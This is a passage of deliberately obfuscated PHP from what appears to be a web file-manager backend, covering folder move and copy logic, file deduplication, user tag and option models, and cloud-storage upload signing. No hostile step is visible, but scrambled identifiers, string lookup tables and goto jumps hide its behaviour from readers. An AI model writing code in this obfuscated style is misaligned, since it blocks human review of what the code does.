$Åïàú» = $›´¤œ§×[$Õğâ“ë[453]] == $Õğâ“ë[88]; $³£¼Õ¡É = $“®İ–ù® ? $“®İ–ù® : $›´¤œ§×[$Õğâ“ë[32]]; $ºÜÆÚœ = $this->fileNameExistAuto($œá§Ä¤æ, $›´¤œ§×); $this->lockMoveStart($±§ª±‘ñ); $this->lockWriteStart($œá§Ä¤æ, $³£¼Õ¡É); if (!$ºÜÆÚœ) { return $this->_moveForce($±§ª±‘ñ, $œá§Ä¤æ, $³£¼Õ¡É); } $Ğâ ş«Ÿ = $ºÜÆÚœ; $ÊÍ¦½³ç = !1; if ($Åïàú») { if ($Ù†„Ÿõä == REPEAT_RENAME_FOLDER) { $³£¼Õ¡É = $this->fileNameAuto($œá§Ä¤æ, $³£¼Õ¡É, $Ù†„Ÿõä, $Åïàú»); $Ğâ ş«Ÿ = $this->_moveForce($±§ª±‘ñ, $œá§Ä¤æ, $³£¼Õ¡É); } else { if ($Ù†„Ÿõä == REPEAT_RENAME_FOLDER) { $Ù†„Ÿõä = REPEAT_RENAME; } $ƒÏßõ–½ = $this->_childrenListSelect($±§ª±‘ñ); foreach ($ƒÏßõ–½ as $åò€˜è×) { $this->_move($åò€˜è×[$Õğâ“ë[181]], $ºÜÆÚœ, $Ù†„Ÿõä, $Ë°ùÍ¤); } $ÊÍ¦½³ç = !0; } } else { if ($Ù†„Ÿõä == REPEAT_SKIP) { $ÊÍ¦½³ç = !0; } else { if ($Ù†„Ÿõä == REPEAT_RENAME || $Ù†„Ÿõä == REPEAT_RENAME_FOLDER) { $³£¼Õ¡É = $this->fileNameAuto($œá§Ä¤æ, $³£¼Õ¡É, $Ù†„Ÿõä, $Åïàú»); $Ğâ ş«Ÿ = $this->_moveForce($±§ª±‘ñ, $œá§Ä¤æ, $³£¼Õ¡É); } else { if ($Ù†„Ÿõä == REPEAT_REPLACE) { $¹…È´§ì = $this->sourceInfoCache($ºÜÆÚœ); $ëö·ÏİÂ = $this->fileHistory($¹…È´§ì, $›´¤œ§×[$Õğâ“ë[509]], $›´¤œ§×[$Õğâ“ë[76]]); $ÊÍ¦½³ç = !0; if ($ëö·ÏİÂ) { $Ë°ùÍ¤[$Õğâ“ë[597]][] = $›´¤œ§×[$Õğâ“ë[509]]; } } } } } if ($ÊÍ¦½³ç && !$Ë°ùÍ¤[$Õğâ“ë[628]]) { $Ë°ùÍ¤[$Õğâ“ë[628]] = !0; } return $Ğâ ş«Ÿ; } private function _moveForce($ıĞÙ¨“•, $Ìµ¤Ú…©, $ëõ’€ˆ) { $Ê˜¡ßËê =& $_SERVER[—ÌÒğš÷]; $Í½Å¨‘Ö = $this->sourceInfo($ıĞÙ¨“•); $Ìôá¿ìø = $this->sourceInfo($Ìµ¤Ú…©); $Ş¨…×”ú = $Í½Å¨‘Ö[$Ê˜¡ßËê[453]] == $Ê˜¡ßËê[88]; $ò×›¥íí = array($Ê˜¡ßËê[445] => $Ìôá¿ìø[$Ê˜¡ßËê[181]], $Ê˜¡ßËê[620] => $Ìôá¿ìø[$Ê˜¡ßËê[553]] . $Ìôá¿ìø[$Ê˜¡ßËê[181]] . $Ê˜¡ßËê[50], $Ê˜¡ßËê[616] => $Ìôá¿ìø[$Ê˜¡ßËê[178]], $Ê˜¡ßËê[617] => $Ìôá¿ìø[$Ê˜¡ßËê[538]], $Ê˜¡ßËê[619] => USER_ID, $Ê˜¡ßËê[462] => $ëõ’€ˆ); $ùù»Ö­ò = $Í½Å¨‘Ö[$Ê˜¡ßËê[178]] == SourceModel::TYPE_GROUP && $Ìôá¿ìø[$Ê˜¡ßËê[178]] == SourceModel::TYPE_GROUP && $Í½Å¨‘Ö[$Ê˜¡ßËê[538]] == $Ìôá¿ìø[$Ê˜¡ßËê[538]]; if (!$ùù»Ö­ò && $this->moveClearAuth) { Model($Ê˜¡ßËê[535])->authClear($ıĞÙ¨“•); } $Ú¨¯Çªã = $Í½Å¨‘Ö[$Ê˜¡ßËê[473]] == $Ê˜¡ßËê[88] && $Ìôá¿ìø[$Ê˜¡ßËê[473]] != $Ê˜¡ßËê[88]; if ($Ú¨¯Çªã) { $ò×›¥íí[$Ê˜¡ßËê[472]] = 0; } if ($Ş¨…×”ú) { $ààÓ¾›Î = array($Ê˜¡ßËê[620] => array($Ê˜¡ßËê[580], $Í½Å¨‘Ö[$Ê˜¡ßËê[553]] . $Í½Å¨‘Ö[$Ê˜¡ßËê[181]] . $Ê˜¡ßËê[581])); $±¿ âöç = $Í½Å¨‘Ö[$Ê˜¡ßËê[553]] . $Í½Å¨‘Ö[$Ê˜¡ßËê[181]] . $Ê˜¡ßËê[50]; $¯·æŸ¹¸ = $Ìôá¿ìø[$Ê˜¡ßËê[553]] . $Ìôá¿ìø[$Ê˜¡ßËê[181]] . $Ê˜¡ßËê[50] . $Í½Å¨‘Ö[$Ê˜¡ßËê[181]] . $Ê˜¡ßËê[50]; $¦²íŞÚ  = array($Ê˜¡ßËê[620] => array($Ê˜¡ßËê[629], "\162\145\x70\154\x61\x63\x65\50\160\141\x72\145\156\x74\114\145\166\145\x6c\54\47{$±¿ âöç}\x27\x2c\x27{$¯·æŸ¹¸}\47\x29"), $Ê˜¡ßËê[616] => $Ìôá¿ìø[$Ê˜¡ßËê[178]], $Ê˜¡ßËê[617] => $Ìôá¿ìø[$Ê˜¡ßËê[538]]); if ($Ú¨¯Çªã) { $¦²íŞÚ [$Ê˜¡ßËê[472]] = 0; } $this->where($ààÓ¾›Î)->data($¦²íŞÚ )->save(); } $this->where(array($Ê˜¡ßËê[459] => $ıĞÙ¨“•))->data($ò×›¥íí)->save(); return $ıĞÙ¨“•; } private function clearShare($¨ó“»Ã¿, $¹„¡ÜÙ) { $˜ºÌ— =& $_SERVER[—ÌÒğš÷]; $Ğ‡ãŸ«­ = $this->sourceInfo($¨ó“»Ã¿); $æÍàë¿Ü = $this->sourceInfo($¹„¡ÜÙ); if ($Ğ‡ãŸ«­[$˜ºÌ—[538]] == $æÍàë¿Ü[$˜ºÌ—[538]] && $Ğ‡ãŸ«­[$˜ºÌ—[178]] == $˜ºÌ—[630]) { return; } $ÃŠöóÒ¦ = array($˜ºÌ—[553] => array($˜ºÌ—[580], $Ğ‡ãŸ«­[$˜ºÌ—[553]] . $¨ó“»Ã¿ . $˜ºÌ—[581])); $µ«úˆîˆ = $this->field($˜ºÌ—[459])->where($ÃŠöóÒ¦)->getField($˜ºÌ—[181], !0); if (!$µ«úˆîˆ) { return; } $ÃŠöóÒ¦ = array($˜ºÌ—[181] => array($˜ºÌ—[7], $µ«úˆîˆ), $˜ºÌ—[631] => 1); $öä“Ç¦ = Model($˜ºÌ—[632])->field($˜ºÌ—[633])->where($ÃŠöóÒ¦)->select(); if (!$öä“Ç¦) { return; } $öä“Ç¦ = array_to_keyvalue($öä“Ç¦, $˜ºÌ—[12], $˜ºÌ—[633]); $ÃŠöóÒ¦ = array($˜ºÌ—[633] => array($˜ºÌ—[7], $öä“Ç¦)); Model($˜ºÌ—[632])->where($ÃŠöóÒ¦)->save(array($˜ºÌ—[631] => 0)); Model($˜ºÌ—[634])->where($ÃŠöóÒ¦)->delete(); } public function copyFolderFromIO($±ÌŞäÆ¦, $ä‹ªŞó˜, $È»¯ñàì, $Êú¿’ÊÊ, $¦Èµ§Â„, $áÔÆ†“ = false) { $„‚ı§ø =& $_SERVER[—ÌÒğš÷]; $â§ÄÀËÉ = array($„‚ı§ø[598] => array(), $„‚ı§ø[599] => array(), $„‚ı§ø[597] => array(), $„‚ı§ø[635] => array()); $Óº”À • = $áÔÆ†“ ? $áÔÆ†“ : $±ÌŞäÆ¦->pathThis($ä‹ªŞó˜); $„·½ôıÆ = $this->fileNameExist($È»¯ñàì, $Óº”À •); $£¸Â«‰â = $this->mkdir($È»¯ñàì, $Óº”À •, $Êú¿’ÊÊ); if (!$„·½ôıÆ || $Êú¿’ÊÊ == REPEAT_RENAME_FOLDER) { $Êú¿’ÊÊ = !1; } if ($„·½ôıÆ) { $this->_childrenAllMake($„·½ôıÆ); } Hook::trigger($„‚ı§ø[636]); $this->_copyChildTo($±ÌŞäÆ¦, $ä‹ªŞó˜, $£¸Â«‰â, $Êú¿’ÊÊ, $â§ÄÀËÉ, $¦Èµ§Â„); Hook::trigger($„‚ı§ø[637]); if ($£¸Â«‰â) { $this->folderSizeResetChildren($£¸Â«‰â); } $this->_childrenListClear(); Model($„‚ı§ø[600])->addAll($â§ÄÀËÉ[$„‚ı§ø[598]], array(), !0); Model($„‚ı§ø[601])->eventCopy($£¸Â«‰â); $this->saveAll($â§ÄÀËÉ[$„‚ı§ø[599]]); Model($„‚ı§ø[512])->linkAdd($â§ÄÀËÉ[$„‚ı§ø[597]]); Model($„‚ı§ø[512])->remove($â§ÄÀËÉ[$„‚ı§ø[635]]); $this->folderSizeReset($È»¯ñàì); $this->updateModifyTime($È»¯ñàì); return $£¸Â«‰â; } private function _copyChildTo($¬Ä²ıâ°, $ƒÂš¤í†, $×ÓŒíƒö, $ù£€ï½ë, &$‘ïúÑŠš, $Áî¼ˆñ) { $êäÇŠÔ² =& $_SERVER[—ÌÒğš÷]; $‘­§æó› = $this->sourceInfoCache($×ÓŒíƒö); $šœ‡áì = $¬Ä²ıâ°->listPath($ƒÂš¤í†); $šœ‡áì = $šœ‡áì ? $šœ‡áì : array($êäÇŠÔ²[83] => array(), $êäÇŠÔ²[82] => array()); $éíıÂğ = array_merge($šœ‡áì[$êäÇŠÔ²[83]], $šœ‡áì[$êäÇŠÔ²[82]]); $‡™†ˆµŒ = $this->_addFiles($¬Ä²ıâ°, $šœ‡áì[$êäÇŠÔ²[83]], $Áî¼ˆñ); $› š ¨Ó = array(); foreach ($éíıÂğ as &$ïÆøåª) { if (isset($‡™†ˆµŒ[$ïÆøåª[$êäÇŠÔ²[32]]])) { $ïÆøåª = $‡™†ˆµŒ[$ïÆøåª[$êäÇŠÔ²[32]]]; } $ïÆøåª[$êäÇŠÔ²[453]] = $ïÆøåª[$êäÇŠÔ²[33]] == $êäÇŠÔ²[75]; $ïÆøåª[$êäÇŠÔ²[454]] = substr(_get($ïÆøåª, $êäÇŠÔ²[175], $êäÇŠÔ²[12]), 0, 10); $ïÆøåª[$êäÇŠÔ²[76]] = _get($ïÆøåª, $êäÇŠÔ²[76], 0); $ïÆøåª[$êäÇŠÔ²[509]] = _get($ïÆøåª, $êäÇŠÔ²[509], 0); if (!isset($ïÆøåª[$êäÇŠÔ²[638]]) && $ïÆøåª[$êäÇŠÔ²[509]]) { $‘ïúÑŠš[$êäÇŠÔ²[635]][] = $ïÆøåª[$êäÇŠÔ²[509]]; } if ($ù£€ï½ë) { $•”øŒ—– = $this->fileNameExistCache($×ÓŒíƒö, $ïÆøåª[$êäÇŠÔ²[32]]); if ($•”øŒ—–) { if ($ïÆøåª[$êäÇŠÔ²[453]] || $ù£€ï½ë == REPEAT_SKIP) { continue; } if ($ù£€ï½ë == REPEAT_REPLACE) { $º¹ş”´´ = $this->sourceInfoCache($•”øŒ—–); $ø¸…¯ºª = $this->fileHistory($º¹ş”´´, $ïÆøåª[$êäÇŠÔ²[509]], $ïÆøåª[$êäÇŠÔ²[76]]); if ($ø¸…¯ºª) { $‘ïúÑŠš[$êäÇŠÔ²[597]][] = $ïÆøåª[$êäÇŠÔ²[509]]; } continue; } else { if ($ù£€ï½ë == REPEAT_RENAME) { $ïÆøåª[$êäÇŠÔ²[32]] = $this->fileNameAutoCache($×ÓŒíƒö, $ïÆøåª[$êäÇŠÔ²[32]], $ù£€ï½ë, !1); } } } } if (!$ïÆøåª[$êäÇŠÔ²[453]] && $ïÆøåª[$êäÇŠÔ²[509]] == 0) { continue; } if (!$ïÆøåª[$êäÇŠÔ²[453]] && $ïÆøåª[$êäÇŠÔ²[509]]) { $‘ïúÑŠš[$êäÇŠÔ²[597]][] = $ïÆøåª[$êäÇŠÔ²[509]]; } $› š ¨Ó[] = $this->_makeItemData($ïÆøåª, $‘­§æó›, $ïÆøåª[$êäÇŠÔ²[32]]); } unset($ïÆøåª); if (!empty($› š ¨Ó)) { $this->addAll($› š ¨Ó); $this->_childrenListSelect($×ÓŒíƒö); } $Ë¥¾¥¡ = $this->_childrenList($×ÓŒíƒö); $Ë¥¾¥¡ = array_to_keyvalue($Ë¥¾¥¡, $êäÇŠÔ²[32]); foreach ($éíıÂğ as $ïÆøåª) { $º¹ş”´´ = $Ë¥¾¥¡[$ïÆøåª[$êäÇŠÔ²[32]]]; $©„»šæƒ = $º¹ş”´´[$êäÇŠÔ²[181]]; $this->_copyApplyMeta($º¹ş”´´, $‘ïúÑŠš); if ($ïÆøåª[$êäÇŠÔ²[33]] == $êäÇŠÔ²[75]) { $ïÆøåª[$êäÇŠÔ²[84]] = $¬Ä²ıâ°->getPathInner($ïÆøåª[$êäÇŠÔ²[84]]); $this->_copyChildTo($¬Ä²ıâ°, $ïÆøåª[$êäÇŠÔ²[84]], $©„»šæƒ, $ù£€ï½ë, $‘ïúÑŠš, $Áî¼ˆñ); } } } private function _addFiles($á¢úÜ…®, $ø®˜âÈ , $Š¦®á™) { $ôÎ¼…µ =& $_SERVER[—ÌÒğš÷]; if (!$ø®˜âÈ  || count($ø®˜âÈ ) == 0) { return array(); } $¦à÷’¿ğ = array(); foreach ($ø®˜âÈ  as &$â“Á÷²¦) { Hook::trigger($ôÎ¼…µ[639], $â“Á÷²¦); $â“Á÷²¦[$ôÎ¼…µ[84]] = $á¢úÜ…®->getPathInner($â“Á÷²¦[$ôÎ¼…µ[84]]); $ªŞÌ““ = $á¢úÜ…®->hashSimple($â“Á÷²¦[$ôÎ¼…µ[84]]); $û¢ÆèÉœ = $á¢úÜ…®->hashMd5($â“Á÷²¦[$ôÎ¼…µ[84]]); if (strlen($û¢ÆèÉœ) > 10 && !isset($¦à÷’¿ğ[$û¢ÆèÉœ])) { $¦à÷’¿ğ[$û¢ÆèÉœ] = array(); } $â“Á÷²¦[$ôÎ¼…µ[640]] = $ªŞÌ““; $â“Á÷²¦[$ôÎ¼…µ[641]] = $û¢ÆèÉœ; $¦à÷’¿ğ[$û¢ÆèÉœ][] =& $â“Á÷²¦; if (count($¦à÷’¿ğ[$û¢ÆèÉœ]) > 1) { $â“Á÷²¦[$ôÎ¼…µ[638]] = !0; } Hook::trigger($ôÎ¼…µ[642], $â“Á÷²¦); } unset($â“Á÷²¦); $¤¢×‘²á = array($ôÎ¼…µ[641] => array($ôÎ¼…µ[7], array_keys($¦à÷’¿ğ))); $ÄÇ‰Ò = Model($ôÎ¼…µ[643]); $óò‚ƒü = $ÄÇ‰Ò->where($¤¢×‘²á)->select(); $óò‚ƒü = $óò‚ƒü ? $óò‚ƒü : array(); foreach ($óò‚ƒü as $ìšöŠï) { if (!isset($¦à÷’¿ğ[$ìšöŠï[$ôÎ¼…µ[641]]])) { continue; } $’ÑÊ™ç¢ = $¦à÷’¿ğ[$ìšöŠï[$ôÎ¼…µ[641]]]; foreach ($’ÑÊ™ç¢ as &$â“Á÷²¦) { $â“Á÷²¦[$ôÎ¼…µ[509]] = $ìšöŠï[$ôÎ¼…µ[509]]; $â“Á÷²¦[$ôÎ¼…µ[638]] = !0; } unset($â“Á÷²¦); } $ìø ÏÀ’ = array(); foreach ($ø®˜âÈ  as $—’£Ğì) { Hook::trigger($ôÎ¼…µ[644], $—’£Ğì); if (isset($—’£Ğì[$ôÎ¼…µ[638]]) && $—’£Ğì[$ôÎ¼…µ[638]]) { Hook::trigger($ôÎ¼…µ[645], $—’£Ğì); continue; } $ñ«í¥ƒ» = $á¢úÜ…®->getPathInner($—’£Ğì[$ôÎ¼…µ[84]]); $Àñ£ó© = $ÄÇ‰Ò->addFileMake($ñ«í¥ƒ», $—’£Ğì[$ôÎ¼…µ[76]], $—’£Ğì[$ôÎ¼…µ[640]], $—’£Ğì[$ôÎ¼…µ[641]], $—’£Ğì[$ôÎ¼…µ[32]], $Š¦®á™); Hook::trigger($ôÎ¼…µ[645], $—’£Ğì); if (!is_array($Àñ£ó©)) { continue; } $ìø ÏÀ’[] = $Àñ£ó©; } $ÄÇ‰Ò->addAll($ìø ÏÀ’); $¤¢×‘²á = array($ôÎ¼…µ[641] => array($ôÎ¼…µ[7], array_keys($¦à÷’¿ğ))); $óò‚ƒü = $ÄÇ‰Ò->where($¤¢×‘²á)->select(); $óò‚ƒü = $óò‚ƒü ? $óò‚ƒü : array(); foreach ($óò‚ƒü as $ìšöŠï) { if (!isset($¦à÷’¿ğ[$ìšöŠï[$ôÎ¼…µ[641]]])) { continue; } $áÕïÈÀò =& $¦à÷’¿ğ[$ìšöŠï[$ôÎ¼…µ[641]]]; foreach ($áÕïÈÀò as &$â“Á÷²¦) { $â“Á÷²¦[$ôÎ¼…µ[509]] = $ìšöŠï[$ôÎ¼…µ[509]]; } unset($â“Á÷²¦); } $Œ»Ü¢éå = array(); foreach ($ø®˜âÈ  as $û†í·İı) { $Œ»Ü¢éå[$û†í·İı[$ôÎ¼…µ[32]]] = $û†í·İı; } return $Œ»Ü¢éå; } } goto aœïŸŠ£¶; E¢ùÇ¾÷¨: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\157\160\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($—Öâ«É‹) { $‚«÷üÆ =& $_SERVER[—ÌÒğš÷]; $ïÄòÛä¯ = defined($‚«÷üÆ[2108]) && USER_ID ? USER_ID : $‚«÷üÆ[12]; return "\x55\x73\145\x72\x4f\x70\164\x69\157\x6e\137{$—Öâ«É‹}\x5f" . $ïÄòÛä¯; } protected function filterWhere($ğÍö®»¨) { $Ÿ•ĞÌ´Í =& $_SERVER[—ÌÒğš÷]; $ğÍö®»¨[$Ÿ•ĞÌ´Í[1688]] = defined($Ÿ•ĞÌ´Í[2108]) && USER_ID ? USER_ID : $Ÿ•ĞÌ´Í[12]; return $ğÍö®»¨; } public function cacheRemoveUser($§¢¿õø, $ä±ƒ³Ú) { return Cache::remove("\x55\163\x65\x72\117\160\x74\151\157\x6e\x5f{$§¢¿õø}\x5f" . $ä±ƒ³Ú); } protected function optionDefault($’áñ§‰Ï = '') { $ÂÕÄ‡¾Æ =& $_SERVER[—ÌÒğš÷]; if ($’áñ§‰Ï == $ÂÕÄ‡¾Æ[12]) { return $GLOBALS[$ÂÕÄ‡¾Æ[6]][$ÂÕÄ‡¾Æ[2384]]; } if ($’áñ§‰Ï == $ÂÕÄ‡¾Æ[2385]) { return $GLOBALS[$ÂÕÄ‡¾Æ[6]][$ÂÕÄ‡¾Æ[2386]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\164\141\x67\114\x69\x73\x74"; public $modelType = "\125\163\145\162\x4f\x70\x74\151\x6f\156"; public $field = array("\156\141\x6d\145", "\163\164\x79\x6c\x65", "\163\x6f\x72\x74"); public function listData($•úÖáû÷ = false, $õ¼éÌ˜ = "\163\x6f\162\164", $¹ºº¨Ò  = false) { return parent::listData($•úÖáû÷, $õ¼éÌ˜, $¹ºº¨Ò ); } public function remove($¼ªÀ£í) { return parent::remove($¼ªÀ£í); } public function add($ üïüº¯, $»ùíŠ· = "\154\x61\142\x65\x6c\55\147\162\x65\171\x2d\x6e\157\162\x6d\141\x6c") { $æ¿Áá¨¢ =& $_SERVER[—ÌÒğš÷]; if ($this->findByName($ üïüº¯)) { return !1; } $Í¡Ô”ë = array($æ¿Áá¨¢[462] => $ üïüº¯, $æ¿Áá¨¢[526] => $»ùíŠ·, $æ¿Áá¨¢[1891] => $this->getSort($æ¿Áá¨¢[302]) + 1); return parent::insert($Í¡Ô”ë); } public function update($Ó¦¨İÊÜ, $ÜŠ“ìØÌ) { $ÚÚŞŞ· =& $_SERVER[—ÌÒğš÷]; $ÖÓûØˆ = $this->listData($Ó¦¨İÊÜ); $§ø Áâ  = $this->findByName($ÜŠ“ìØÌ[$ÚÚŞŞ·[32]]); if (!$ÖÓûØˆ || $§ø Áâ  && $§ø Áâ [$ÚÚŞŞ·[443]] != $ÖÓûØˆ[$ÚÚŞŞ·[443]]) { return !1; } return parent::update($Ó¦¨İÊÜ, $ÜŠ“ìØÌ); } public function moveTop($ªˆÊâÛÃ) { $ãµ´²æô =& $_SERVER[—ÌÒğš÷]; $ã­éÇ¼ = parent::listData(); $Üı¦¹› = $this->getSort($ãµ´²æô[301]); foreach ($ã­éÇ¼ as &$£“‰ñôÁ) { if ($£“‰ñôÁ[$ãµ´²æô[443]] == $ªˆÊâÛÃ) { $£“‰ñôÁ[$ãµ´²æô[1911]] = $Üı¦¹›; continue; } $£“‰ñôÁ[$ãµ´²æô[1911]] += 1; } unset($£“‰ñôÁ); return parent::resetData($ã­éÇ¼); } public function moveBottom($üÄÉ½¡Â) { $ù¦ìó†Ä =& $_SERVER[—ÌÒğš÷]; $É·Î…”£ = $this->getSort($ù¦ìó†Ä[302]) + 1; return parent::update($üÄÉ½¡Â, array($ù¦ìó†Ä[1911] => $É·Î…”£)); } public function resetSort($ëÚÍŒ‰Ò) { $Ë™“á’ =& $_SERVER[—ÌÒğš÷]; $‘µ´‡Ûê = array(); $ëÚÍŒ‰Ò = is_array($ëÚÍŒ‰Ò) ? $ëÚÍŒ‰Ò : array(); for ($œ—»õ û = 0; $œ—»õ û < count($ëÚÍŒ‰Ò); $œ—»õ û++) { $‘µ´‡Ûê[$ëÚÍŒ‰Ò[$œ—»õ û] . $Ë™“á’[12]] = $œ—»õ û + 1; } $·˜”«ò˜ = parent::listData(); foreach ($·˜”«ò˜ as &$ç†Óú°) { $®¹¯ºúÁ = $‘µ´‡Ûê[$ç†Óú°[$Ë™“á’[443]]]; $ç†Óú°[$Ë™“á’[1911]] = $®¹¯ºúÁ ? $®¹¯ºúÁ : $ç†Óú°[$Ë™“á’[1911]]; } unset($ç†Óú°); return parent::resetData($·˜”«ò˜); } private function getSort($¾ÂÓ“º) { $¶Ä¡¤²› =& $_SERVER[—ÌÒğš÷]; $ÔŠ­«• = parent::listData(); $öóë£“· = array_to_keyvalue($ÔŠ­«•, $¶Ä¡¤²›[12], $¶Ä¡¤²›[1911]); if (!$öóë£“·) { $öóë£“· = array(0); } $¡ÈĞµóæ = $¾ÂÓ“º == $¶Ä¡¤²›[302] ? max($öóë£“·) : min($öóë£“·); return intval($¡ÈĞµóæ); } } goto DÔó¶ã­¿ë; D‹õÂ…áÍ : class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Èèë©…™) { parent::__construct($Èèë©…™); $this->signatureVersion($_SERVER[—ÌÒğš÷][231]); } public function uploadFormData($Š§’ñ‰İ, $¾¦µĞ = 3600) { $éÑôõİÜ =& $_SERVER[—ÌÒğš÷]; $§ØÕ¼¯ = $éÑôõİÜ[213]; $û©æ‡Óö = $éÑôõİÜ[247]; $¾İáæŞú = $éÑôõİÜ[257]; $ú‚¼¥ö = gmdate($éÑôõİÜ[1368], time() + $¾¦µĞ); $¬‚•½ = (string) time() . $éÑôõİÜ[71] . (string) (time() + $¾¦µĞ); $ôí—òÖ» = array($éÑôõİÜ[258] => $ú‚¼¥ö, $éÑôõİÜ[261] => array(array($éÑôõİÜ[263] => $§ØÕ¼¯), array($éÑôõİÜ[262] => $this->bucket), array($éÑôõİÜ[264], $éÑôõİÜ[265], $éÑôõİÜ[12]), array($éÑôõİÜ[268] => $¾İáæŞú), array($éÑôõİÜ[1369] => $û©æ‡Óö), array($éÑôõİÜ[1370] => $this->accessKey), array($éÑôõİÜ[1371] => $¬‚•½))); $ôí—òÖ» = json_encode($ôí—òÖ»); $‹ú“­‡Ş = hash_hmac($éÑôõİÜ[247], $¬‚•½, $this->secret); $ßˆüÉŸ½ = sha1($ôí—òÖ»); $ËğİÑö¨ = hash_hmac($éÑôõİÜ[247], $ßˆüÉŸ½, $‹ú“­‡Ş); $£Å¡éÄƒ = array($éÑôõİÜ[263] => $§ØÕ¼¯, $éÑôõİÜ[268] => $¾İáæŞú, $éÑôõİÜ[276] => base64_encode($ôí—òÖ»), $éÑôõİÜ[1369] => $û©æ‡Óö, $éÑôõİÜ[1370] => $this->accessKey, $éÑôõİÜ[1372] => $¬‚•½, $éÑôõİÜ[1373] => $ËğİÑö¨, $éÑôõİÜ[196] => $this->getHost()); return $£Å¡éÄƒ; } public function fileOutLink($šÀç÷€¨) { $¿µ€ÀÆã =& $_SERVER[—ÌÒğš÷]; if (substr($šÀç÷€¨, 0, 7) == $¿µ€ÀÆã[1374]) { $šÀç÷€¨ = $¿µ€ÀÆã[1375] . substr($šÀç÷€¨, 7); } header($¿µ€ÀÆã[162] . $šÀç÷€¨); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¾Ğ…¤¤·) { $this->pathParse = $¾Ğ…¤¤·; $this->model = Model($_SERVER[—ÌÒğš÷][1376]); } public function getPath($ßÎœ™¹³) { return trim($ßÎœ™¹³, $_SERVER[—ÌÒğš÷][8]); } public function pathFather($³ƒÃ„Éï) { $•¤¿¢î = $this->parse($³ƒÃ„Éï); $•¤¿¢î = $this->infoSimple($³ƒÃ„Éï); return $•¤¿¢î ? $•¤¿¢î[$_SERVER[—ÌÒğš÷][180]] : !1; } public function pathThis($ş€æ‹é÷) { $½ó¼±à = $this->infoSimple($ş€æ‹é÷); return $½ó¼±à ? $½ó¼±à[$_SERVER[—ÌÒğš÷][32]] : !1; } public function getPathOuter($ññ³¸­Ä) { if (!$ññ³¸­Ä) { return $ññ³¸­Ä; } $Í„ã½´¹ = $this->parse($ññ³¸­Ä); return KodIO::make($Í„ã½´¹[$_SERVER[—ÌÒğš÷][443]]); } public function copyFolderFromIO($Ïí×˜”Ó, $îçæÎ‰§, $¿Ğ”±£È, $È‘È–Éî, $ùØˆä) { $•Üü©ğœ = $this->model->copyFolderFromIO($Ïí×˜”Ó, $îçæÎ‰§, $¿Ğ”±£È, $È‘È–Éî, $ùØˆä); return KodIO::make($•Üü©ğœ); } public function isParentOf($¿™¤œ¿¾, $·â‚Œ¾á) { return $this->model->isParentOf($¿™¤œ¿¾, $·â‚Œ¾á); } public function mkfile($¬¡ßœ˜, $ÉöéÖô = '', $Í¼ï—ÕĞ = REPEAT_RENAME) { $ÅÏŠ¾›û =& $_SERVER[—ÌÒğš÷]; $Ô…¯ó‰ô = $this->parse($¬¡ßœ˜); $¬¡ßœ˜ = $Ô…¯ó‰ô[$ÅÏŠ¾›û[443]]; for ($éŠİºÉ = 0; $éŠİºÉ < count($Ô…¯ó‰ô[$ÅÏŠ¾›û[1377]]); $éŠİºÉ++) { $Ù°ØæŞŒ = $Ô…¯ó‰ô[$ÅÏŠ¾›û[1377]][$éŠİºÉ]; if ($éŠİºÉ == count($Ô…¯ó‰ô[$ÅÏŠ¾›û[1377]]) - 1) { $¬¡ßœ˜ = $this->model->mkfile($¬¡ßœ˜, $Ù°ØæŞŒ, $ÉöéÖô, $Í¼ï—ÕĞ); break; } $¬¡ßœ˜ = $this->model->mkdir($¬¡ßœ˜, $Ù°ØæŞŒ, REPEAT_SKIP); } return $this->getPathOuter($¬¡ßœ˜); } public function mkdir($óÆšé¨§, $Ø±æ‡Á = REPEAT_SKIP) { $ß¼å‹µŞ =& $_SERVER[—ÌÒğš÷]; $‡ù„µè = $this->parse($óÆšé¨§); $óÆšé¨§ = $‡ù„µè[$ß¼å‹µŞ[443]]; for ($ÚÔ½„ü = 0; $ÚÔ½„ü < count($‡ù„µè[$ß¼å‹µŞ[1377]]); $ÚÔ½„ü++) { $şîÒÒşÁ = $‡ù„µè[$ß¼å‹µŞ[1377]][$ÚÔ½„ü]; $óÆšé¨§ = $this->model->mkdir($óÆšé¨§, $şîÒÒşÁ, $Ø±æ‡Á); } return $this->getPathOuter($óÆšé¨§); } public function copyFile($­±ŞêÄĞ, $¶ñ¹ê·ı, $Çƒ´±˜Ã = REPEAT_REPLACE) { $°ê«×± =& $_SERVER[—ÌÒğš÷]; $šÀüñ‘ë = $this->parse($¶ñ¹ê·ı); $•´òïÖ¶ = $this->model->copy($­±ŞêÄĞ, $šÀüñ‘ë[$°ê«×±[443]], $Çƒ´±˜Ã, $šÀüñ‘ë[$°ê«×±[84]]); return $•´òïÖ¶ ? $this->getPathOuter($•´òïÖ¶) : !1; } public function moveFile($âª˜¨æö, $ÌÈìæ®, $ì¡ñÕëÙ = REPEAT_REPLACE) { $­×ÙìÊÎ =& $_SERVER[—ÌÒğš÷]; $€•½ÛØ = $this->parse($ÌÈìæ®); $ÛÙåß†¿ = $this->model->move($âª˜¨æö, $€•½ÛØ[$­×ÙìÊÎ[443]], $ì¡ñÕëÙ, $€•½ÛØ[$­×ÙìÊÎ[84]]); return $ÛÙåß†¿ ? $this->getPathOuter($ÛÙåß†¿) : !1; } public function copy($³İ…Êê, $±É±™µ¢, $®ÖşÑÓ¨ = REPEAT_REPLACE, $ÏÁ°®¸À = false) { $‘ÙŒ÷À = $this->parse($±É±™µ¢); $Â´âè½” = $this->model->copy($³İ…Êê, $‘ÙŒ÷À[$_SERVER[—ÌÒğš÷][443]], $®ÖşÑÓ¨, $ÏÁ°®¸À); return $Â´âè½” ? $this->getPathOuter($Â´âè½”) : !1; } public function moveSameAllow() { } public function move($–¸úØË, $×İÁ˜Ü¸, $£ÍÖ±Ğ– = REPEAT_REPLACE, $İ‚ñÎìØ = false) { $»ó¬î÷— = $this->parse($×İÁ˜Ü¸); $üæîŒĞ† = $this->model->move($–¸úØË, $»ó¬î÷—[$_SERVER[—ÌÒğš÷][443]], $£ÍÖ±Ğ–, $İ‚ñÎìØ); return $üæîŒĞ† ? $this->getPathOuter($üæîŒĞ†) : !1; } public function remove($š˜Ğ¥ƒ·, $ıŞù·õ = true) { return $this->model->remove($š˜Ğ¥ƒ·, $ıŞù·õ); } public function 